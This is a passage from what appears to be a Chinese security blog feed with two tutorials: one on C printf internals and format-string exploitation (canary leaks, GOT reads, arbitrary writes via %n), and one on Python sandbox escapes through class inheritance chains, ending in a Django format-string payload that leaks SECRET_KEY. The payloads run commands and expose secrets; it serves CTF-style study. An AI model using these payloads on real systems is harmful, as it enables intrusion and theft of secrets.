<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">4</span>;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">3</span>;</span><br><span class="line">    <span class="type">int</span> c = a/b;</span><br><span class="line">    <span class="type">float</span> d =  *(<span class="type">float</span>*)(&amp;c);</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> e = <span class="number">0xffffffffffffffff</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a/b:%f，a:%d\n&quot;</span>,a/b,a,b);          <span class="comment">//打印0</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;(float)a/b:%f\n&quot;</span>,((<span class="type">float</span>)a)/b);   <span class="comment">//打印1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;(double)a/b:%lf\n&quot;</span>,((<span class="type">double</span>)a)/b);<span class="comment">//打印2</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;d:%f\n&quot;</span>,d);                       <span class="comment">//打印3</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.*f\n&quot;</span>,<span class="number">20</span>,(<span class="type">double</span>)a/b);          <span class="comment">//打印4</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;e:%d,a:%d\n&quot;</span>,e,a);                <span class="comment">//打印5</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a:%d,++a:%d,a++:%d\n&quot;</span>,a,++a,a++); <span class="comment">//打印6</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行的结果是</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">a/b:<span class="number">0.000000</span>，a:<span class="number">1</span></span><br><span class="line">(<span class="type">float</span>)a/b:<span class="number">1.333333</span></span><br><span class="line">(<span class="type">double</span>)a/b:<span class="number">1.333333</span></span><br><span class="line">d:<span class="number">0.000000</span></span><br><span class="line"><span class="number">1.33333333333333325932</span></span><br><span class="line">e:<span class="number">-1</span>,a:<span class="number">4</span></span><br><span class="line">a:<span class="number">6</span>,++a:<span class="number">6</span>,a++:<span class="number">4</span></span><br></pre></td></tr></table></figure>
<p>第一次看到这个题的时候，感觉很奇怪，<code>printf(&quot;a/b:%f，a:%d\n&quot;,a/b,a,b);</code> 。这里格式化字符串里面只有两位，为什么要传入三个参数。</p>
<p>所以这里我们主要关注打印0-2涉及到的知识点</p>
<ol>
<li>
<p>每个参数执行“默认实际参数提升”</p>
<ol>
<li>提升规则如下: float将提升到double</li>
<li>char、short和相应的signed、unsigned类型将提升到int</li>
</ol>
</li>
<li>
<p>printf实际上只会接受到double，int，long int等类型的参数。而从来不会实际接受到float，char，short等类型参数。</p>
</li>
</ol>
<p><img src="image7.png" alt=""></p>
<p>我们gdb调试结果来佐证一下。</p>
<h2 id="格式化字符串漏洞">格式化字符串漏洞</h2>
<p>先来看一下prinf支持的各种参数</p>
<ul>
<li><code>%d</code> 或 <code>%i</code>：整数</li>
<li><code>%u</code>：无符号整数</li>
<li><code>%f</code>：浮点数</li>
<li><code>%x</code>：十六进制整数（小写）</li>
<li><code>%X</code>：十六进制整数（大写）</li>
<li><code>%o</code>：八进制整数</li>
<li><code>%s</code>：字符串</li>
<li><code>%c</code>：字符</li>
<li><code>%p</code>：指针地址</li>
<li><code>%n</code>：写入的字符数</li>
</ul>
<h3 id="格式化字符串泄漏栈上内存数据">格式化字符串泄漏栈上内存数据</h3>
<p>这种套路，一般用%08x, %p来泄漏栈上数据。举一个leak cannary的例子。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">if</span>(fgets(buf, <span class="keyword">sizeof</span> buf, <span class="built_in">stdin</span>) == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gcc -g -Wall -fstack-protector-all -o program_with_canary program.c</span><br></pre></td></tr></table></figure>
<p>Cannary会被从QWORD PTR fs:0x28放到栈上，然后我们用%p来读，一个%p读8字节的内存。</p>
<p><img src="image8.png" alt=""></p>
<p>实际需要多少个可以通过gdb或静态分析来算。这里给用14个就行了。</p>
<p><img src="image9.png" alt=""></p>
<h3 id="格式化字符串泄漏任意地址数据">格式化字符串泄漏任意地址数据</h3>
<p>这种套路一般用来泄漏got表数据，先构想读地址的值在栈上，然后调用%s去读这个地址。</p>
<p>因为这个地址需要在栈上，所以这里为方便用32位程序演示。这个值肯定和printf的第一个参数有一些偏移。所以最后我们需要用%n$s这种“加强版”的%s去读到偏移。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gcc -g -m32 -Wall -fno-<span class="built_in">stack</span>-protector -o vulnerable_program program.c</span><br></pre></td></tr></table></figure>
<p>先来读一下GOT表</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">readelf -r vulnerable_program | grep fget</span><br><span class="line"><span class="number">0804</span>c010  <span class="number">00000207</span> R_386_JUMP_SLOT   <span class="number">00000000</span>   fgets@GLIBC_2<span class="number">.0</span></span><br></pre></td></tr></table></figure>
<p>和刚才思路类似，先用以一坨%p看一下偏移</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p</span><br></pre></td></tr></table></figure>
<p><img src="image10.png" alt=""></p>
<p>这里AAAA被断开了，所以我们还需要padding一下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">PPAAAA%p %p %p %p %p %p %p %p %p %p %p %p %p %p</span><br></pre></td></tr></table></figure>
<p><img src="image11.png" alt=""></p>
<p>所以我只需要用%8$s即可以读到GOT表地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import sys; sys.stdout.buffer.write(b&quot;PP\x10\xc0\x04\x08%8$s\n&quot;)&#x27;</span>  </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">b main</span><br><span class="line">run &lt; text</span><br></pre></td></tr></table></figure>
<p><img src="image12.png" alt=""></p>
<p><img src="image13.png" alt=""></p>
<h3 id="格式化字符串向任意地址写入数据">格式化字符串向任意地址写入数据</h3>
<p>这种要结合%n来利用，先来看一下%n的用法。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;AAAA%n\n&quot;</span>, &amp;i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>printf解析到%n会把输出的字符串的长度放在i中。</p>
<p><img src="image14.png" alt=""></p>
<p>在漏洞利用中，类似于我们用\x10\xc0\x04\x08%8$s去偏移8处读\x10\xc0\x04\x08地址的值。我门用\x10\xc0\x04\x08%8$n去偏移8处的\x10\xc0\x04\x08地址写入打印出来的字符个数。这样我们只要控制打印字数就可以控制任意地址的值了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import sys; sys.stdout.buffer.write(b&quot;PP\x10\xc0\x04\x08%8$n\n&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
<p>修改前 p *0x0804c010</p>
<p><img src="image15.png" alt=""></p>
<p>修改后</p>
<p><img src="image16.png" alt=""></p>
<p>这里我们只输出六个字符，太少了。实际利用肯定要写入一个地址(比如one gadget的地址)，这个地址一般都很大比如0x80c0ffff，所以需要结合printf的对齐语法来写入大值。</p>
<p>假设第10个偏移是0x0804c010，那我们理论上就可以把地址0x0804c010写入0x08ffffff的值</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import sys; sys.stdout.buffer.write(b&quot;%150994943d%12$nAA\x10\xc0\x04\x08\n&quot;)&#x27;</span> &gt; te</span><br></pre></td></tr></table></figure>
<p><img src="image17.png" alt=""></p>
<p>在输出大量padding过后成功修改完地址</p>
<p><img src="image18.png" alt=""></p>
<p>这种方法简单粗暴，但更优雅的方式是逐字节修改。</p>
<p>依次对0804c010写入0xff，0804c011写入0xff，0804c012写入0xff，0804c013写入0x08</p>
<h2 id="附-non-pie-与-ASLR">附 non pie 与 ASLR</h2>
<p>程序是no pie的就算操作系统开了ASLR也没用？</p>
<ol>
<li>
<p>ASLR（Address Space Layout Randomization）：</p>
<ol>
<li>这是一个操作系统级别的安全特性。</li>
<li>它随机化进程的内存布局，包括堆、栈、共享库的加载位置等。</li>
</ol>
</li>
<li>
<p>PIE（Position Independent Executable）：</p>
<ol>
<li>这是一个编译时的选项。</li>
<li>它使可执行文件的代码段也能被随机化。</li>
</ol>
</li>
<li>
<p>ASLR 和 no-PIE 的组合效果：</p>
<ol>
<li>
<p>如果程序是 no-PIE 的（非位置独立可执行文件），但操作系统开启了 ASLR：</p>
<ul>
<li>程序的代码段（.text）将会在固定的地址加载。</li>
<li>但是，堆、栈、共享库等仍然会被随机化。</li>
</ul>
</li>
</ol>
</li>
</ol>
<h2 id="附-python字符集的坑">附 python字符集的坑</h2>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">parallels@parallels-Parallels-Virtual-Platform:~/Desktop$ python3 -c <span class="string">&#x27;print(&quot;PP\x10\xc0\x04\x08%7$s&quot;)&#x27;</span>  &gt; text</span><br><span class="line">parallels@parallels-Parallels-Virtual-Platform:~/Desktop$ cat text |xxd</span><br><span class="line"><span class="number">00000000</span>: <span class="number">5050</span> <span class="number">10</span>c3 <span class="number">8004</span> <span class="number">0825</span> <span class="number">3724</span> <span class="number">730</span>a            PP.....%<span class="number">7</span>$s.</span><br></pre></td></tr></table></figure>
<h2 id="参考">参考</h2>
<p><a href="https://blog.csdn.net/dreamer2020/article/details/24158303">https://blog.csdn.net/dreamer2020/article/details/24158303</a></p>
<p><a href="https://www.yanbinghu.com/2018/12/02/10796.html">https://www.yanbinghu.com/2018/12/02/10796.html</a></p>
<p><a href="https://www.cnblogs.com/jillzhang/archive/2007/06/24/793901.html">https://www.cnblogs.com/jillzhang/archive/2007/06/24/793901.html</a></p>
<p><a href="https://blog.csdn.net/weixin_42250302/article/details/108287860">https://blog.csdn.net/weixin_42250302/article/details/108287860</a></p>
<p><a href="https://www.cnblogs.com/zuoxiaolong/p/computer11.html">https://www.cnblogs.com/zuoxiaolong/p/computer11.html</a></p>
<p><a href="https://github.com/firmianay/CTF-All-In-One/blob/master/SUMMARY.md">https://github.com/firmianay/CTF-All-In-One/blob/master/SUMMARY.md</a></p>
]]></content>
      <tags>
        <tag>binary</tag>
      </tags>
  </entry>
  <entry>
    <title>用python继承链搞事情</title>
    <url>/2018/04/24/%E7%94%A8python%E7%BB%A7%E6%89%BF%E9%93%BE%E6%90%9E%E4%BA%8B%E6%83%85/</url>
    <content><![CDATA[<!-- 继承链这个这个词是我自己发明的。看到有的师傅博客中将它称为egg或者ssti，但是我喜欢叫它继承链因为感觉很生动。最早遇到这种姿势是在学习python bypass沙盒的时候。当时不是很理解形如`().__class__.__bases__[0].__subclasses__()`的意思。学习一段时间后，我决定来总结一下构造继承链的方法，并且用此方法在django有格式化字符串漏洞的情况下读取配置文件（灵感来自p师傅博客）。 -->
<!-- more -->
<h1>前言</h1>
<p>继承链这个这个词是我自己发明的。看到有的师傅博客中将它称为egg或者ssti，但是我喜欢叫它继承链因为感觉很生动。最早遇到这种姿势是在学习python bypass沙盒的时候。当时不是很理解形如<code>().__class__.__bases__[0].__subclasses__()</code>的意思。学习一段时间后，我决定来总结一下构造继承链的方法，并且用此方法在django有格式化字符串漏洞的情况下读取配置文件（灵感来自p师傅博客）。</p>
<h1>基础知识</h1>
<h2 id="bases"><strong>bases</strong></h2>
<p>返回一个类直接所继承的类（元组形式）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base1</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Base2</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>(Base1, Base2):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test2</span>(<span class="title class_ inherited__">test</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span> test.__bases__</span><br><span class="line"><span class="built_in">print</span> test2.__bases__</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">(&lt;class __main__.Base1 at 0x0322ADF8&gt;, &lt;class __main__.Base2 at 0x0322AE30&gt;)</span></span><br><span class="line"><span class="string">(&lt;class __main__.test at 0x0322AE68&gt;,)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<p>在看别人文章时发现__mro__和__bases__用法相同，两者具体区别， 暂时留个坑。</p>
<p>一些情况下也可用<code>__base__</code>直接返回单个的类</p>
<h2 id="class"><strong>class</strong></h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">obj = Base()</span><br><span class="line"><span class="built_in">print</span> obj.__class__</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">__main__.Base</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<p>返回一个实例所属的类</p>
<h2 id="globals"><strong>globals</strong></h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">var = <span class="number">2333</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span> test.__init__.__globals__</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&#123;&#x27;__builtins__&#x27;: &lt;module &#x27;__builtin__&#x27; (built-in)&gt;, &#x27;__file__&#x27;: &#x27;backup.py&#x27;, &#x27;__package__&#x27;: None, &#x27;fun&#x27;: &lt;function fun at 0x7f542e44b5f0&gt;, &#x27;test&#x27;: &lt;class __main__.test at 0x7f542e43b598&gt;, &#x27;var&#x27;: 2333, &#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;os&#x27;: &lt;module &#x27;os&#x27; from &#x27;/usr/lib/python2.7/os.pyc&#x27;&gt;, &#x27;__doc__&#x27;: None&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<p>使用方式是 <code>函数名.__globals__</code>，返回一个当前空间下能使用的模块，方法和变量的字典。</p>
<p><a href="https://www.notion.so/61202a69e4ee434099d89b4576fc0ee5">Untitled</a></p>
<h2 id="subclasses"><strong>subclasses</strong>()</h2>
<p>获取一个类的子类，返回的是一个列表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base1</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>(<span class="title class_ inherited__">Base1</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span> Base1.__subclasses__()</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[&lt;class &#x27;__main__.test&#x27;&gt;]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="builtin-builtins"><strong>builtin</strong> &amp;&amp; <strong>builtins</strong></h2>
<p>python中可以直接运行一些函数，例如<code>int(),list()</code>等等。这些函数可以在<code>__builtins__</code>中可以查到。查看的方法是<code>dir(__builtins__)</code>。在控制台中直接输入<code>__builtins__</code>会看到如下情况</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#python2</span><br><span class="line">&gt;&gt;&gt; __builtins__</span><br><span class="line">&lt;module &#x27;__builtin__&#x27; (built-in)&gt;</span><br></pre></td></tr></table></figure>
<p><em>ps：在py3中<code>__builtin__</code>被换成了<code>builtin</code></em></p>
<p><code>__builtin__</code> 和 <code>__builtins__</code>之间是什么关系呢？</p>
<p>1、在主模块<code>main</code>中，<code>__builtins__</code>是对内建模块<code>__builtin__</code>本身的引用，即<code>__builtins__</code>完全等价于<code>__builtin__</code>，二者完全是一个东西，不分彼此。</p>
<p>2、非主模块<code>main</code>中，<code>__builtins__</code>仅是对<code>__builtin__.__dict__</code>的引用，而非<code>__builtin__</code>本身</p>
<h1>继承链bypass沙盒</h1>
<h2 id="用file对象读取文件">用file对象读取文件</h2>
<p>构造继承链的一种思路是：</p>
<ol>
<li>随便找一个内置类对象用<code>__class__</code>拿到他所对应的类</li>
<li>用<code>__bases__</code>拿到基类（<code>&lt;class 'object'&gt;</code>）</li>
<li>用<code>__subclasses__()</code>拿到子类列表</li>
<li>在子类列表中直接寻找可以利用的类</li>
</ol>
<p>一言敝之</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()</span><br><span class="line">().__class__.__bases__[0].__subclasses__()</span><br></pre></td></tr></table></figure>
<p>可以看到列表里面有一坨，这里只看file对象。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[...,&lt;type &#x27;file&#x27;&gt;, ...]</span><br></pre></td></tr></table></figure>
<p>查找<code>file</code>位置。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">search = <span class="string">&#x27;file&#x27;</span></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(i):</span><br><span class="line">        <span class="built_in">print</span> num</span><br><span class="line">    num += <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><code>&lt;type 'file'&gt;</code>在第40位。<code>().__class__.__bases__[0].__subclasses__()[40]</code></p>
<p>用<code>dir</code>来看看内置的方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir(().__class__.__bases__[0].__subclasses__()[40])</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&#x27;__class__&#x27;, &#x27;__delattr__&#x27;, &#x27;__doc__&#x27;, &#x27;__enter__&#x27;, &#x27;__exit__&#x27;, &#x27;__format__&#x27;, &#x27;__getattribute__&#x27;, &#x27;__hash__&#x27;, &#x27;__init__&#x27;, &#x27;__iter__&#x27;, &#x27;__new__&#x27;, &#x27;__reduce__&#x27;, &#x27;__reduce_ex__&#x27;, &#x27;__repr__&#x27;, &#x27;__setattr__&#x27;, &#x27;__sizeof__&#x27;, &#x27;__str__&#x27;, &#x27;__subclasshook__&#x27;, &#x27;close&#x27;, &#x27;closed&#x27;, &#x27;encoding&#x27;, &#x27;errors&#x27;, &#x27;fileno&#x27;, &#x27;flush&#x27;, &#x27;isatty&#x27;, &#x27;mode&#x27;, &#x27;name&#x27;, &#x27;newlines&#x27;, &#x27;next&#x27;, &#x27;read&#x27;, &#x27;readinto&#x27;, &#x27;readline&#x27;, &#x27;readlines&#x27;, &#x27;seek&#x27;, &#x27;softspace&#x27;, &#x27;tell&#x27;, &#x27;truncate&#x27;, &#x27;write&#x27;, &#x27;writelines&#x27;, &#x27;xreadlines&#x27;]</span><br></pre></td></tr></table></figure>
<p>所以最终的payload是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[40](&#x27;filename&#x27;).readlines()</span><br></pre></td></tr></table></figure>
<p>然后用同样的手法可以得到<code>__mro__</code>形式下的payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">().__class__.__mro__[1].__subclasses__()[40](&#x27;filename&#x27;).readlines()</span><br></pre></td></tr></table></figure>
<p>这种方法等价于</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file(&#x27;backup.py&#x27;).readlines()</span><br></pre></td></tr></table></figure>
<p><strong>但是python3已经移除了file。所以第一种方法只能在py2中用。</strong></p>
<h2 id="用内置模块执行命令">用内置模块执行命令</h2>
<p>第二种方法接着第一种的思路接着探索。第一种止步于把内置的对象列举出来，其实可以用<code>__globals__</code>更深入的去看每个类可以调用的东西（包括模块，类，变量等等），万一有<code>os</code>这种东西就赚了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">search = <span class="string">&#x27;os&#x27;</span>	<span class="comment">#也可以是其他你想利用的模块</span></span><br><span class="line">num = -<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            <span class="built_in">print</span>(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span> </span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">(&lt;class &#x27;site._Printer&#x27;&gt;, 72)</span></span><br><span class="line"><span class="string">(&lt;class &#x27;site.Quitter&#x27;&gt;, 77)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">77</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">72</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>不过很可惜上述的方法也只能在py2中使用。</strong></p>
<h2 id="第三种">第三种</h2>
<p>那有没有通吃py2和py3的方法呢？答案是有的，就用上面<code>__builtins__</code>来搞事。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">search = <span class="string">&#x27;__builtins__&#x27;</span></span><br><span class="line">num = -<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            <span class="built_in">print</span>(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt; 64</span></span><br><span class="line"><span class="string">#省略一堆</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<p>于是乎</p>
<p>py3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[64].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;)</span><br></pre></td></tr></table></figure>
<p>py2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;)</span><br></pre></td></tr></table></figure>
<h1>继承链读django配置信息</h1>
<p>p师傅的<a href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html#django">利用格式化字符串漏洞泄露Django配置信息</a>一文中给了两个payload都是无登陆情况下读到django配置信息，我们可以用上面所述方法找到更多的payload。</p>
<p>测试代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search</span>(<span class="params">request</span>):</span><br><span class="line">    template = <span class="string">&#x27;Hello &#123;user&#125;, This is your search: &#x27;</span> + request.GET.get(<span class="string">&#x27;keyword&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(template.<span class="built_in">format</span>(user=request.user))</span><br></pre></td></tr></table></figure>
<p>因为是无登陆情况，所以requests.User里面的对象是<code>AnonymousUser</code>的实例</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AnonymousUser</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="comment">#省略</span></span><br><span class="line">    _groups = EmptyManager(Group)</span><br><span class="line">    _user_permissions = EmptyManager(Permission)</span><br></pre></td></tr></table></figure>
<p>观察到<code>_groups</code>属性是一个<code>EmptyManager</code>对象。</p>
<p>跟踪<code>EmptyManager</code><a href="http://xn--manger-or3j541l.py">来到manger.py</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">##省略</span></span><br><span class="line"><span class="keyword">from</span> django.db.models.query <span class="keyword">import</span> QuerySet</span><br><span class="line"><span class="comment">##省略</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EmptyManager</span>(<span class="title class_ inherited__">Manager</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, model</span>):</span><br><span class="line">        <span class="built_in">super</span>(EmptyManager, <span class="variable language_">self</span>).__init__()</span><br><span class="line">        <span class="variable language_">self</span>.model = model</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_queryset</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>(EmptyManager, <span class="variable language_">self</span>).get_queryset().none(</span><br></pre></td></tr></table></figure>
<p>跟踪<code>QuerySet</code><a href="http://xn--query-6o6hw08j.py">来到query.py</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">##省略</span></span><br><span class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"><span class="comment">##省略</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">QuerySet</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Represents a lazy database lookup for a set of objects.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, model=<span class="literal">None</span>, query=<span class="literal">None</span>, using=<span class="literal">None</span>, hints=<span class="literal">None</span></span>):</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>settings</code>里面就是django的配置了。</p>
<p>将上面的跟踪一步一步转换成payload就是</p>
<p>拿到<code>EmptyManager</code>对象：<code>user._groups.__class__</code></p>
<p>拿到<code>QuerySet</code>对象：<code>user._groups.__class__.__base__.__init__.__globals__[QuerySet]</code></p>
<p>拿到SECRET_KEY</p>
<p><code>&#123;user._groups.__class__.__base__.__init__.__globals__[QuerySet].__init__.__globals__[settings].SECRET_KEY&#125;</code></p>
<p>所以最后的payload是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8000/search?keyword=&#123;user._groups.__class__.__base__.__init__.__globals__[QuerySet].__init__.__globals__[settings].SECRET_KEY&#125;</span><br></pre></td></tr></table></figure>
